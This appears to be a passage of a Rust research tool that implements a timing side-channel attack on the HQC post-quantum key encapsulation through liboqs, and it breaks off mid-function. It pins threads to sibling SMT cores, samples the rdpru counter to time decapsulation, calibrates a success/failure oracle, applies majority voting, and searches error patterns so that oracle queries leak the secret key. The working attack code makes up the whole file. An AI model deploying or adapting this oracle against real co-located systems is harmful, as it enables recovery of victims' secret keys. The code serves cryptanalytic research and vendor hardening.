#![feature(portable_simd)]
mod hqc;
mod util;

use rug::{ops::Pow, Float};
use spin::{barrier::Barrier, Spin};
use std::{
    arch::asm,
    borrow::Borrow,
    collections::HashMap,
    error::Error,
    fs::{File, OpenOptions},
    io::{BufRead, BufReader, BufWriter, Read, Write},
    marker::PhantomData,
    path::PathBuf,
    sync::{
        atomic::{AtomicBool, AtomicU32, Ordering},
        Arc, Condvar, Mutex,
    },
    thread,
    time::Instant,
};
use tracing::{debug, error, info, info_span};
use tracing_subscriber::{fmt, prelude::*};

use bit_set::BitSet;

use hqc::{Ct, Hqc};

use nix::{
    sched::{sched_getaffinity, sched_setaffinity, CpuSet},
    unistd::Pid,
};
use num_integer::binomial;
use oqs::kem::{Ciphertext, PublicKeyRef, SecretKey, SecretKeyRef};

use rand::{Rng, SeedableRng};
use rand_chacha::ChaCha12Rng;
use rayon::prelude::*;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::{
    hqc::{Poly, TimingLeakage},
    util::{format_hex, sample_cww_indexes},
};

struct Attack<T: Hqc> {
    _pd: std::marker::PhantomData<T>,
}

fn add_vec(a: &[u64], b: &[u64]) -> Vec<u64> {
    assert_eq!(a.len(), b.len());
    let mut a: Vec<_> = a.into();
    a.iter_mut().zip(b).for_each(|(a, b)| *a ^= b);
    a
}

fn add_sparse(a: &mut [u64], idxs: &[u32]) {
    for pos in idxs.iter() {
        let block = pos / 64;
        let bit = pos % 64;
        a[block as usize] ^= 1 << bit;
    }
}

fn options(n: u64, w: u64) -> u64 {
    (1..=w).map(|k| binomial(n, k)).sum::<u64>()
}

#[derive(Debug, PartialEq, Eq, PartialOrd, Ord, Copy, Clone)]
enum Mutation {
    RandomWeight(u32),
    RandMutationWeight(u32),
}

struct Dataset {
    errors: Vec<(Vec<u32>, u32)>,
    samples: u64,
}
#[derive(Debug)]
struct AttackProbs {
    tester_failure_probability: f64,
    attack_success_probability: f64,
}

pub trait SideChannelOracle {
    /// Returns true iff the ciphertext is predicted to still decrypt to the original message (i.e. whether decryption succeeds)
    fn call(&mut self, rng: &mut impl Rng, ct: &Ct) -> bool;
}

impl<T: SideChannelOracle> SideChannelOracle for &mut T {
    fn call(&mut self, rng: &mut impl Rng, ct: &Ct) -> bool {
        (*self).call(rng, ct)
    }
}

static CORE_ALLOCATOR: CoreAllocator = CoreAllocator {
    used: std::sync::Mutex::new(Vec::new()),
    ready: Condvar::new(),
};

#[derive(Debug)]
struct CoreAllocator {
    used: std::sync::Mutex<Vec<bool>>,
    ready: Condvar,
}

impl CoreAllocator {
    fn alloc(&self) -> CoreHandle<'_> {
        let mut used = self.used.lock().unwrap();
        loop {
            if used.len() == 0 {
                *used = vec![false; num_cpus::get_physical()];
            }
            for (i, x) in used.iter_mut().enumerate() {
                if !*x {
                    *x = true;
                    return CoreHandle {
                        core: i,
                        alloc: self,
                    };
                }
            }
            used = self.ready.wait(used).unwrap();
        }
    }
}

#[derive(Debug)]
struct CoreHandle<'a> {
    pub core: usize,
    alloc: &'a CoreAllocator,
}

impl<'a> Drop for CoreHandle<'a> {
    fn drop(&mut self) {
        let mut used = self.alloc.used.lock().unwrap();
        assert!(used[self.core]);
        used[self.core] = false;
        self.alloc.ready.notify_one();
    }
}

struct SMTOracle<T: Send> {
    core: CoreHandle<'static>,

    threshold: u64,
    sk: SecretKey,
    _pd: PhantomData<T>,
    num_traces: u64,
}

fn measure_timing<T: Hqc + Send>(
    core_alloc: &CoreHandle<'_>,
    sk: &SecretKey,
    ct: &Ct,
    n: u32,
) -> (u64, u64) {
    let ctr: Ciphertext = T::ciphertext_to_string(ct);
    let start = Arc::new(Barrier::<Spin>::new(2));
    let stop = Arc::new(Barrier::<Spin>::new(2));
    let done_decaps = Arc::new(AtomicBool::new(false));
    let (smt_a, smt_b) = get_sibling();
    let off = core_alloc.core;
    let (smt_a, smt_b) = (smt_a + off, smt_b + off);
    debug!("Got threads ({smt_a},{smt_b})");
    let total_done = Arc::new(AtomicBool::new(false));
    let t = std::thread::spawn({
        let start = start.clone();
        let stop = stop.clone();
        let done_decaps = done_decaps.clone();
        let total_done = total_done.clone();
        let sk = sk.clone();
        move || {
            let mut cpu_set = CpuSet::new();
            cpu_set.set(smt_a).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();
            thread::yield_now();
            let oqs = T::oqs();
            loop {
                start.wait();
                if total_done.load(Ordering::SeqCst) {
                    break;
                }
                oqs.decapsulate(&sk, &ctr).ok();
                done_decaps.store(true, Ordering::SeqCst);
                stop.wait();
                done_decaps.store(false, Ordering::SeqCst);
            }
        }
    });
    let previous = sched_getaffinity(Pid::from_raw(0)).unwrap();
    let mut cpu_set = CpuSet::new();
    cpu_set.set(smt_b).unwrap();
    sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();
    thread::yield_now();
    let mut measurements = vec![0u32; 30000];
    let mut runtimes = Vec::with_capacity(n.try_into().unwrap());
    let division_thresh = 100; // TODO: make this a parameter? or learn it too
    let max_delta = 300;
    let mut trace_id = 0;
    let mut num_traces = 0;
    while trace_id < n {
        for m in measurements.iter_mut() {
            *m = 0;
        }
        num_traces += 1;
        let len = measurements.len();
        let mut i = 0;
        start.wait();
        while !done_decaps.load(Ordering::SeqCst) && i < len {
            unsafe { *measurements.get_unchecked_mut(i) = rdpru32() };
            // measurements[i] = rdpru32();
            let mut _dividend = 1;
            let mut _remainder: u64 = 0;
            let divisor = 1;

            unsafe {
                asm!(
                    ".rept 5",
                    "xor edx, edx",
                    "div rcx",
                    ".endr",
                    inout("rax") _dividend,
                    inout("rdx") _remainder,
                    in("rcx") divisor,
                );
            }
            i += 1;
        }
        stop.wait();
        if i == measurements.len() {
            debug!("Exhausted all {i} measurement slots.");
            continue;
        }

        let mut runtime = 0u64;
        let mut ignore = false;
        let mut division_run = 0;
        let mut division_run_length = 0;

        for j in 1..i {
            if let Some(delta) = measurements[j].checked_sub(measurements[j - 1]) {
                if delta > division_thresh && delta < max_delta {
                    division_run += 1;
                    division_run_length += delta as u64;
                } else {
                    if division_run > 6 {
                        runtime += division_run_length;
                    }
                    division_run = 0;
                    division_run_length = 0;
                }
            } else {
                // debug!("Negative time delta");
                ignore = true;
                break;
            }
        }
        // Ignore traces that have too long or too short division runtime
        if ignore || !(runtime > 11000 && runtime < 13000) {
            continue;
        }
        runtimes.push(runtime);
        trace_id += 1;
        // Comment in to write out the SMT traces
        // debug!("Trace {trace_id} with length {i} and above threshold latency of {runtime}");
        // {
        //     std::fs::create_dir("data").ok();
        //     let mut f =
        //         BufWriter::new(File::create(format!("data/trace_{trace_id}.csv",)).unwrap());
        //     writeln!(f, "cycles").unwrap();
        //     for i in 1..i {
        //         writeln!(f, "{}", measurements[i] - measurements[i - 1]).unwrap();
        //     }
        // }
    }
    sched_setaffinity(Pid::from_raw(0), &previous).unwrap();
    total_done.store(true, Ordering::SeqCst);
    start.wait();
    t.join().unwrap();

    runtimes.sort_unstable();
    let median_runtime = runtimes[runtimes.len() / 2];
    // println!("{runtimes:?}");
    (median_runtime, num_traces)
}

#[derive(Debug, Clone)]
struct CalibrationResult {
    threshold: u64,
    tpr: f64,
    tnr: f64,
    num_traces: u64,
}

fn calibrate<T: Hqc + Send>(
    core: &CoreHandle<'_>,
    sk: &SecretKey,
    fast: &Ct,
    mut other: impl FnMut() -> Ct,
    n_traces: u32,
    dump_accuracy: Option<Arc<Mutex<BufWriter<File>>>>,
    dump_timings: Option<Arc<Mutex<BufWriter<File>>>>,
    diff: u32,
) -> CalibrationResult {
    let skip = 10;
    let n = 500;
    debug!("Calibrating SMT oracle");
    let mut fast_timings = Vec::new();
    let mut other_timings = Vec::new();
    let mut total_num_traces = 0;
    for i in 0..2 * n + skip {
        let (t, num_traces) = if i % 2 == 0 {
            measure_timing::<T>(core, sk, fast, n_traces)
        } else {
            measure_timing::<T>(core, sk, &other(), n_traces)
        };
        total_num_traces += num_traces;
        debug!(
            "{:>5} {i:>3}/{} {:>5} {:>5} cycles",
            if i % 2 == 0 { "fast" } else { "other" },
            2 * n + skip,
            if i % 2 == 0 {
                format!("{t}")
            } else {
                "".to_owned()
            },
            if i % 2 != 0 {
                format!("{t}")
            } else {
                "".to_owned()
            },
        );

        if i >= skip {
            if i % 2 == 0 {
                fast_timings.push(t);
            } else {
                other_timings.push(t);
            }
        }
    }

    fast_timings.sort_unstable();
    other_timings.sort_unstable();

    debug!(
        "Fast timings median: {}",
        fast_timings[fast_timings.len() / 2]
    );
    debug!(
        "Other timings median: {}",
        other_timings[other_timings.len() / 2]
    );

    let mut fptr = 0;
    let mut optr = 0;

    let total = fast_timings.len() + other_timings.len();

    let mut last_thresh;
    let mut thresh = 0;
    let mut best_correct = 0;
    let mut best_thresh = 0;
    let mut best_fast_correct = 0;
    let mut best_other_correct = 0;

    while fptr < fast_timings.len() || optr < other_timings.len() {
        last_thresh = thresh;
        thresh = if fptr < fast_timings.len() && optr < other_timings.len() {
            fast_timings[fptr].min(other_timings[optr])
        } else if fptr < fast_timings.len() {
            fast_timings[fptr]
        } else {
            other_timings[optr]
        };

        while fptr < fast_timings.len() && fast_timings[fptr] <= thresh {
            fptr += 1;
        }

        while optr < other_timings.len() && other_timings[optr] <= thresh {
            optr += 1;
        }

        let fast_correct = fptr;
        let other_correct = other_timings.len() - optr;

        let correct = fast_correct + other_correct; // / total

        if correct > best_correct {
            best_fast_correct = fast_correct;
            best_other_correct = other_correct;
            best_correct = correct;
            best_thresh = (thresh + last_thresh) / 2;
            debug!("new best threshold @ {best_thresh} with {correct} correct out of {total}");
        }
    }
    if let Some(dump_timings) = dump_timings {
        let mut dump_timings = dump_timings.lock().unwrap();
        for t in fast_timings {
            writeln!(dump_timings, "fast,{t},{diff}").unwrap();
        }
        for t in other_timings {
            writeln!(dump_timings, "rand,{t},{diff}").unwrap();
        }
    }

    let prev_tpr = best_fast_correct as f64 / n as f64;
    let prev_tnr = best_other_correct as f64 / n as f64;
    info!("prev_tpr={prev_tpr} prev_tnr={prev_tnr}");

    // Test oracle
    debug!("Testing oracle");
    let mut fast_correct = 0;
    let mut other_correct = 0;
    let mut fast_timings = Vec::new();
    let mut other_timings = Vec::new();
    // let mut rng = rand::thread_rng();
    // let random_id: String = (0..32)
    //     .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
    //     .collect();
    // let random_id_path = format!("data/test_traces_{random_id}.csv");
    // let mut f = BufWriter::new(File::create(random_id_path).unwrap());
    // writeln!(f, "class,time").unwrap();
    for i in 0..2 * n + skip {
        let (t, num_traces) = if i % 2 == 0 {
            measure_timing::<T>(core, sk, fast, n_traces)
        } else {
            measure_timing::<T>(core, sk, &other(), n_traces)
        };
        // writeln!(f, "{},{}", if i % 2 == 0 { "fast" } else { "rand" }, t).unwrap();
        total_num_traces += num_traces;
        debug!(
            "{:>5} {i:>3}/{} {:>5} {:>5} cycles",
            if i % 2 == 0 { "fast" } else { "other" },
            2 * n + skip,
            if i % 2 == 0 {
                format!("{t}")
            } else {
                "".to_owned()
            },
            if i % 2 != 0 {
                format!("{t}")
            } else {
                "".to_owned()
            },
        );

        if i >= skip {
            if i % 2 == 0 {
                fast_timings.push(t);
            } else {
                other_timings.push(t);
            }
        }
    }

    for &fast_timing in &fast_timings {
        if fast_timing <= best_thresh {
            fast_correct += 1;
        }
    }
    for &other_timing in &other_timings {
        if other_timing > best_thresh {
            other_correct += 1;
        }
    }

    let tpr = fast_correct as f64 / n as f64;
    let tnr = other_correct as f64 / n as f64;
    let accuracy = (fast_correct + other_correct) as f64 / (2 * n) as f64;
    info!("n_traces={n_traces} tpr={tpr} tnr={tnr} accuracy={accuracy}");
    if let Some(dump_accuracy) = dump_accuracy {
        let mut dump_accuracy = dump_accuracy.lock().unwrap();
        writeln!(dump_accuracy, "{n_traces},{accuracy},{diff}").unwrap();
    }
    CalibrationResult {
        threshold: best_thresh,
        tpr,
        tnr,
        num_traces: total_num_traces,
    }
}

impl<T: Hqc + Send> SMTOracle<T> {
    pub fn new(
        sk: SecretKey,
        pk: PublicKeyRef,
        salt: Option<&[u8]>,
        original_message: Vec<u8>,
    ) -> Result<(Self, CalibrationResult), Box<dyn Error>> {
        let fast = get_fast_ciphertext::<T>(pk, original_message, salt);
        let core = CORE_ALLOCATOR.alloc();
        let n_traces = 100;
        let cr = calibrate::<T>(
            &core,
            &sk,
            &fast,
            || {
                let oqs = T::oqs();
                let ct = oqs.encapsulate(pk);
                T::ciphertext_from_string(&ct.unwrap().0.bytes)
            },
            n_traces,
            None,
            None,
            0,
        );
        Ok((
            Self {
                core,
                threshold: cr.threshold,
                sk,
                _pd: PhantomData {},
                num_traces: cr.num_traces,
            },
            cr,
        ))
    }
}

/// creates a fast ciphertext without any error or shifting
/// useful to measure the SMT oracle's accuracy
fn get_fast_ciphertext<T: Hqc + Send>(
    pk: PublicKeyRef,
    original_message: Vec<u8>,
    salt: Option<&[u8]>,
) -> Ct {
    let e = Poly::zero(T::VEC_N_SIZE_256);
    let r2 = Poly::zero(T::VEC_N_SIZE_256);
    let mut u = Attack::<T>::shift_by(0);
    let u_slice: &mut [u64] = &mut bytemuck::cast_slice_mut(&mut u.v)[..T::VEC_N_SIZE_64];
    let er = T::encaps_chosen_inputs(
        pk.as_ref(),
        original_message.as_slice(),
        bytemuck::cast_slice(u_slice),
        bytemuck::cast_slice(r2.v.as_slice()),
        bytemuck::cast_slice(e.v.as_slice()),
        salt,
    );
    T::ciphertext_from_string(&er.ct)
}

fn rdpru32() -> u32 {
    let lo;
    unsafe {
        asm!("rdpru",
            out("eax") lo,
            out("edx") _,
            in("rcx") 1,
        );
    }
    lo
}

impl<T: Hqc + Send> SMTOracle<T> {}

impl<T: Hqc + Send> SideChannelOracle for SMTOracle<T> {
    fn call(&mut self, _rng: &mut impl Rng, ct: &Ct) -> bool {
        let (t, num_traces) = measure_timing::<T>(&self.core, &self.sk, ct, 100);
        self.num_traces += num_traces;
        let outcome = t <= self.threshold;
        debug!(
            "SMT Oracle: measured {t}. Boundary: {}. Outcome: {outcome}",
            self.threshold
        );
        outcome
    }
}

struct OracleQueryCounter<T: SideChannelOracle> {
    inner: T,
    queries: u64,
}

impl<T: SideChannelOracle> OracleQueryCounter<T> {
    fn queries(&self) -> u64 {
        self.queries
    }
}

impl<T: SideChannelOracle> From<T> for OracleQueryCounter<T> {
    fn from(value: T) -> Self {
        Self {
            inner: value,
            queries: 0,
        }
    }
}

impl<T: SideChannelOracle> SideChannelOracle for OracleQueryCounter<T> {
    fn call(&mut self, rng: &mut impl Rng, ct: &Ct) -> bool {
        self.queries += 1;
        self.inner.call(rng, ct)
    }
}

struct SimulatedLocalOracle<T> {
    mode: OracleMode,
    sk: SecretKey,
    original: Vec<u8>,
    _pd: std::marker::PhantomData<T>,
}

#[derive(Debug, Clone, Copy, clap::ValueEnum, PartialEq, Eq)]
enum OracleTy {
    SimulatedLocal,
    SMTOracle,
}

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum OracleMode {
    Perfect,
    Ideal,
    #[value(skip)]
    SimulatedNoise {
        failure_rate: f64,
    },
}

impl<T: Hqc> SimulatedLocalOracle<T> {
    pub fn new(sk: SecretKey, original_msg: Vec<u8>, mode: OracleMode) -> Self {
        Self {
            mode,
            sk,
            original: original_msg,
            _pd: std::marker::PhantomData,
        }
    }

    fn decode(sk: &SecretKey, ct: &Ct) -> Vec<u8> {
        let sk = T::secret_key_from_string(sk.as_ref());
        let uy = T::vect_mul(&ct.u, &sk.y);
        let i = add_vec(bytemuck::cast_slice(&ct.v), bytemuck::cast_slice(&uy.v));
        T::code_decode(&bytemuck::cast_slice(i.as_slice())[..T::VEC_N1N2_256_SIZE_64])
    }
}

impl<T: Hqc> SideChannelOracle for SimulatedLocalOracle<T> {
    fn call(&mut self, rng: &mut impl Rng, ct: &Ct) -> bool {
        let m2 = Self::decode(&self.sk, ct);
        let mut result = m2 == self.original;
        if let OracleMode::Perfect = self.mode {
            debug!("perfect simulated oracle: {result}");
            return result;
        };
        if !result {
            // there's a chance that depends on the message that the result will be wrong, if there's a decoding failure
            let mut hasher = Sha256::new();
            hasher.update(b"ideal_success_prob");
            hasher.update(m2.as_slice());
            let seed = hasher.finalize();
            let mut rng = ChaCha12Rng::from_seed(seed.as_slice().try_into().unwrap());
            // tuned for HQC round 3
            let ideal_success_prob = 0.9942;
            result = if rng.gen::<f64>() > ideal_success_prob {
                !result
            } else {
                result
            };
        }

        let out = match self.mode {
            OracleMode::Perfect => unreachable!(),
            OracleMode::Ideal => result,
            OracleMode::SimulatedNoise { failure_rate } => {
                let success_prob = 1.0 - failure_rate;
                if rng.gen::<f64>() > success_prob {
                    !result
                } else {
                    result
                }
            }
        };
        debug!("{:?} oracle: {out}", self.mode);
        out
    }
}

struct MajorityVotingOracle<T: SideChannelOracle> {
    inner: T,
    tp_prob: f64,
    tn_prob: f64,
    positive_alpha: f64,
    negative_alpha: f64,
}

impl<T: SideChannelOracle> MajorityVotingOracle<T> {
    fn new(inner: T, tp_prob: f64, tn_prob: f64, positive_alpha: f64, negative_alpha: f64) -> Self {
        Self {
            inner,
            tp_prob,
            tn_prob,
            positive_alpha,
            negative_alpha,
        }
    }
}

const PREC: u32 = 2048;

fn binomial_pdf(p: f64, n: u32, k: u32) -> Float {
    rug::Integer::from(n).binomial(k)
        * Float::with_val(PREC, p).pow(k as i32)
        * Float::with_val(PREC, 1.0 - p).pow((n - k) as i32)
}

impl<T: SideChannelOracle> SideChannelOracle for MajorityVotingOracle<T> {
    fn call(&mut self, rng: &mut impl Rng, ct: &Ct) -> bool {
        let mut pc = 0;
        let mut nc = 0;
        debug!("Majority Voting Oracle Call");
        loop {
            let res = self.inner.call(rng, ct);
            if res {
                pc += 1;
            } else {
                nc += 1;
            }
            // probability of getting pc positives in pc + nc runs
            let pa = binomial_pdf(self.tp_prob, pc + nc, pc);
            // probability of getting nc negatives in pc + nc runs
            let pna = binomial_pdf(self.tn_prob, pc + nc, nc);
            // probability of a positive
            // A ... actual outcome (whether m == m2 as per the perfect oracle)
            // O ... observed outcome (what the inner (i.e. SMTOracle) measured)
            // Pr[O | A] = True Positive Rate
            // Pr[¬O | ¬A] = True Negative Rate
            //
            // Pos ... number of observed positives
            // Neg ... number of observed negatives
            //
            // Assume Pos & Neg are binomially distributed (this isn't necessarily true because of e.g. Hertzbleed or that m2 might have similar timing)
            // Pr[Pos = P, Neg = N | A] = (P + N choose P) * Pr[O | A]^P * (1-Pr[O | A])^N
            //                          = Pr[B(P + N, TPR) = P]
            // and
            // Pr[Pos = P, Neg = N | ¬A] = (P + N choose N) * Pr[¬O | ¬A]^N * (1-Pr[¬O | ¬A])^P
            //                           = (P + N choose N) * Pr[¬O | ¬A]^N * (1-Pr[¬O | ¬A])^P
            //                                           ^- (a + b choose a) = (a + b choose b)
            //                           = Pr[B(P + N, TNR) = N]
            //
            // Finally the probability of a positive, given the observed outcomes:
            // Pr[A | Pos = P, Neg = N] = Pr[Pos = P, Neg = N | A] * Pr[A] / Pr[Pos = P, Neg = N]
            //                          = Pr[Pos = P, Neg = N | A] * Pr[A] / (Pr[Pos = P, Neg = N | A] * Pr[A] + Pr[Pos = P, Neg = N | ¬A] * Pr[¬A])
            // Assume base rate of Pr[A] = Pr[¬A] = 1/2
            //                          = Pr[Pos = P, Neg = N | A] * 1/2 / (1/2 * (Pr[Pos = P, Neg = N | A] + Pr[Pos = P, Neg = N | ¬A]))
            //                          = Pr[Pos = P, Neg = N | A] / (Pr[Pos = P, Neg = N | A] + Pr[Pos = P, Neg = N | ¬A])
            let pos = pa.clone() / (pa + pna);

            if pos > 1.0 - self.positive_alpha {
                debug!("True");
                return true;
            }
            // complement rule: probability of a negative is 1-Pr[positive]
            if pos < self.negative_alpha {
                debug!("False");
                return false;
            }
        }
    }
}

impl<T: Hqc + Send> Attack<T> {
    fn extract_block(cdw: &[u64], i: usize) -> &[u64] {
        assert!(
            cdw.len() == T::VEC_N1N2_256_SIZE_64 || cdw.len() == T::VEC_N_SIZE_64,
            "{} not in [{}, {}]",
            cdw.len(),
            T::VEC_N1N2_256_SIZE_64,
            T::VEC_N_SIZE_64
        );
        let lo = (T::PARAM_N2 / 64) as usize * i;
        let hi = (T::PARAM_N2 / 64) as usize * (i + 1);
        &cdw[lo..hi]
    }

    fn extract_block_mut(cdw: &mut [u64], i: usize) -> &mut [u64] {
        assert!(
            cdw.len() == T::VEC_N1N2_256_SIZE_64 || cdw.len() == T::VEC_N_SIZE_64,
            "{} not in [{}, {}]",
            cdw.len(),
            T::VEC_N1N2_256_SIZE_64,
            T::VEC_N_SIZE_64
        );
        let lo = (T::PARAM_N2 / 64) as usize * i;
        let hi = (T::PARAM_N2 / 64) as usize * (i + 1);
        &mut cdw[lo..hi]
    }

    fn const_blk_exclude_higher_weight_attempt(
        ec: &[u64],
        cdw: &[u64],
        v: u8,
        test_set: &Dataset,
    ) -> Option<BitSet> {
        let mut cdw_plus_ec = add_vec(cdw, ec);
        let v1 = T::rm_decode_single(&cdw_plus_ec);
        if v != v1 {
            return None;
        }

        let s = &mut cdw_plus_ec;
        let mut failed = BitSet::with_capacity(test_set.errors.len());
        let mut opt = 0;
        for (test, _) in test_set.errors.iter() {
            add_sparse(s, test);

            let v2 = T::rm_decode_single(s);

            if v2 == v {
                failed.insert(opt);
            }
            opt += 1;

            add_sparse(s, test);
        }
        Some(failed)
    }

    fn fail_all(opts: usize) -> BitSet {
        let mut bs = BitSet::with_capacity(opts);
        for i in 0..opts {
            bs.insert(i);
        }
        bs
    }

    fn generate_test_set(
        rng: &mut impl Rng,
        weight_distribution: &[f64],
        w_hi: u32,
        required_samples: u64,
    ) -> Dataset {
        let weight_distribution_cdf = &mut weight_distribution.to_vec()[..w_hi as usize];
        let s = weight_distribution_cdf.iter().sum::<f64>();
        weight_distribution_cdf.iter_mut().for_each(|x| *x /= s); // normalize
                                                                  // println!("{weight_distribution_cdf:?}");
        let mut acc = 0.0;
        for x in weight_distribution_cdf.iter_mut() {
            acc += *x;
            *x = acc;
        }
        let mut test_set = HashMap::<_, u32>::new();
        for _ in 0..required_samples {
            let s: f64 = rng.gen();
            let mut w = 0;
            for (i, c) in weight_distribution_cdf.iter().enumerate() {
                if s >= *c {
                    w = i as u32 + 1;
                } else {
                    break;
                }
            }
            w += 1;
            *test_set
                .entry(util::sample_cww_indexes(rng, w, 0..T::PARAM_N2))
                .or_default() += 1;
        }
        Dataset {
            errors: test_set.into_iter().collect::<Vec<_>>(),
            samples: required_samples,
        }
    }

    fn failure_count<G: Borrow<BitSet>, I: Iterator<Item = G> + Clone>(
        test_set: &Dataset,
        w_lo: u32,
        failed_sets: I,
    ) -> u64 {
        let mut failure_count = 0;
        for (pos, (e, c)) in test_set.errors.iter().enumerate() {
            let mut all_fail = true;
            let weight = e.iter().map(|x| x.count_ones()).sum::<u32>();
            let should_not_fail = weight < w_lo;
            for failed in failed_sets.clone() {
                all_fail &= failed.borrow().contains(pos) ^ should_not_fail;
            }
            failure_count += (all_fail as u64) * *c as u64;
        }
        failure_count
    }

    fn compute_failure_and_success_probability<G: Borrow<BitSet>, I: Iterator<Item = G> + Clone>(
        test_set: &Dataset,
        w_lo: u32,
        failed_sets: I,
        trials: u32,
    ) -> AttackProbs {
        let failure_count = Self::failure_count(test_set, w_lo, failed_sets);
        let failure_rate = failure_count as f64 / test_set.samples as f64;
        let estimated_attack_success_prob = (1. - failure_rate).powi(trials as i32);
        AttackProbs {
            tester_failure_probability: failure_rate,
            attack_success_probability: estimated_attack_success_prob,
        }
    }

    fn compute_failed_sets(
        ecs: &[Vec<u64>],
        test_set: &Dataset,
        v: u8,
        cdw: &[u64],
    ) -> Vec<BitSet> {
        let mut failed_sets = vec![];
        for ec in ecs.iter() {
            if let Some(failed) =
                Self::const_blk_exclude_higher_weight_attempt(ec, cdw, v, test_set)
            {
                failed_sets.push(failed);
            } else {
                failed_sets.push(Self::fail_all(test_set.samples as usize));
            }
        }
        failed_sets
    }

    fn const_blk_exclude_higher_weight_vary_l0(
        rng: &mut impl Rng,
        cdw: &[u64],
        i: usize,
        w_lo: u32,
        w_hi: u32,
        tester_size: usize,
    ) -> (Vec<Vec<u64>>, bool) {
        assert_eq!(cdw.len(), T::VEC_N1N2_SIZE_64);
        let mut ecs: Vec<Vec<u64>> = vec![];
        let cdw = Self::extract_block(cdw, i);
        let v = T::rm_decode_single(cdw);

        for _ in 0..tester_size {
            let mut ec = vec![0u64; T::VEC_N2_SIZE_64];
            util::sample_cww(rng, &mut ec, T::PARAM_N2 * 45 / 100);
            ecs.push(ec);
        }

        assert_eq!(ecs.len(), tester_size);

        let opts = options(T::PARAM_N2 as u64, w_hi as u64);
        // debug!("Total error options: {opts}");
        let mut overlap = (u64::MAX, u64::MAX);
        let required_attack_success_prob = 0.95f64;
        let trials = 174 * 2;
        let soundness_error = required_attack_success_prob.powf(1.0 / trials as f64);
        let samples_factor = 10;
        let mut required_samples = samples_factor * (1.0 / (1.0 - soundness_error)) as u64;
        debug!(
            "Creating testset: {} - speedup: {}",
            required_samples,
            opts / required_samples
        );
        let weight_distribution = match T::PARAM_SECURITY {
            128 => [34.38, 24.83, 11.77, 4.12, 1.45],
            192 => [30.00, 27.00, 16.04, 7.07, 3.40],
            256 => [34.06, 24.87, 12.02, 4.32, 1.59],
            _ => panic!("unknown security parameter"),
        };
        let mut test_set =
            Self::generate_test_set(rng, &weight_distribution, w_hi, required_samples);
        let mut failed_sets = Self::compute_failed_sets(&ecs, &test_set, v, cdw);
        let probs = Self::compute_failure_and_success_probability(
            &test_set,
            w_lo,
            failed_sets.iter(),
            trials,
        );
        debug!("probabilities: {probs:?}");
        let mut validation_rng = {
            let mut hasher = Sha256::new();
            hasher.update(b"validation1");
            let result = hasher.finalize();
            ChaCha12Rng::from_seed(result.as_slice().try_into().unwrap())
        };
        let validation_set = Self::generate_test_set(
            &mut validation_rng,
            &weight_distribution,
            w_hi,
            required_samples,
        );
        let validation_probs = Self::compute_failure_and_success_probability(
            &validation_set,
            w_lo,
            Self::compute_failed_sets(&ecs, &validation_set, v, cdw).iter(),
            trials,
        );
        debug!("validation probabilities: {validation_probs:?}");
        let validation_probs = Self::compute_failure_and_success_probability(
            &validation_set,
            w_lo,
            Self::compute_failed_sets(&ecs[..2], &validation_set, v, cdw).iter(),
            trials,
        );
        debug!("validation probabilities with two ecs: {validation_probs:?}");

        if probs.attack_success_probability >= required_attack_success_prob {
            return (ecs, true);
        }

        let mut mutations = vec![];
        for w in T::PARAM_N2 * 40 / 100..=T::PARAM_N2 * 50 / 100 {
            mutations.push(Mutation::RandomWeight(w));
        }
        for w in 1..=3 {
            mutations.push(Mutation::RandMutationWeight(w));
        }
        let mut total_winners = mutations.len();
        let mut mutation_winners = vec![1; mutations.len()];

        let mut no_improvement = 0;
        let mut improvements_since_no_improvement = 0;
        let mut increase_test_size_wait = 500;
        loop {
            let rand_muts = (0..10)
                .flat_map(|_| {
                    let mut rand_muts = vec![];
                    for _ in 0..num_cpus::get() {
                        let mut acc = 0;
                        let which = rng.gen_range(0..total_winners);
                        let mut s = 0;
                        for (i, w) in mutation_winners.iter().enumerate() {
                            s = i;
                            acc += w;
                            if acc > which {
                                break;
                            }
                        }
                        rand_muts.push(s);
                    }
                    rand_muts
                })
                .collect::<Vec<_>>();
            let inputs = rand_muts
                .iter()
                .map(|mutation| {
                    let mut ec = vec![0u64; T::VEC_N2_SIZE_64];
                    match mutations[*mutation] {
                        Mutation::RandomWeight(w) => {
                            util::sample_cww(rng, &mut ec, w);
                        }
                        Mutation::RandMutationWeight(w) => {
                            // mutate an existing one
                            let which = rng.gen_range(0..tester_size);
                            ec = ecs[which].clone();
                            let ecl = ec.len();
                            for _ in 0..w {
                                ec[rng.gen_range(0..ecl)] ^= 1 << rng.gen_range(0..64);
                            }
                        }
                    }
                    (mutation, ec)
                })
                .collect::<Vec<_>>();
            let minimum = inputs
                .par_iter()
                .filter_map(|(mutation, ec)| {
                    if let Some(failed) =
                        Self::const_blk_exclude_higher_weight_attempt(ec, cdw, v, &test_set)
                    {
                        // See if this combination of testers is better than before
                        let mut best_swap = None;
                        let mut best_new_overlap = overlap;
                        for swap_for in 0..ecs.len() {
                            let mut failure_count = 0;
                            let mut two_failure_count = 0;
                            for pos in 0..test_set.errors.len() {
                                let weight = test_set.errors[pos]
                                    .0
                                    .iter()
                                    .map(|x| x.count_ones())
                                    .sum::<u32>();
                                let should_not_fail = weight < w_lo;
                                let mut all_fail = true;
                                let mut first_two_fail = true;
                                for t in 0..swap_for {
                                    let c = failed_sets[t].contains(pos);
                                    all_fail &= c ^ should_not_fail;
                                    if t < 2 {
                                        first_two_fail &= c ^ should_not_fail;
                                    }
                                }
                                let c = failed.contains(pos);
                                all_fail &= c ^ should_not_fail;
                                if swap_for < 2 {
                                    first_two_fail &= c ^ should_not_fail;
                                }
                                for t in swap_for + 1..tester_size {
                                    let c = failed_sets[t].contains(pos);
                                    all_fail &= c ^ should_not_fail;
                                    if t < 2 {
                                        first_two_fail &= c ^ should_not_fail;
                                    }
                                }
                                failure_count += (all_fail as u64) * test_set.errors[pos].1 as u64;
                                two_failure_count +=
                                    (first_two_fail as u64) * test_set.errors[pos].1 as u64;
                            }
                            if (two_failure_count, failure_count) < best_new_overlap {
                                best_new_overlap = (two_failure_count, failure_count);
                                best_swap = Some(swap_for);
                            }
                        }

                        if let Some(swap_for) = best_swap {
                            return Some((best_new_overlap, swap_for, ec, failed, mutation));
                        }
                    }
                    None
                })
                .min();
            if let Some((best_new_overlap, swap_for, ec, failed, mutation)) = minimum {
                overlap = best_new_overlap;
                ecs[swap_for] = ec.clone();
                failed_sets[swap_for] = failed;

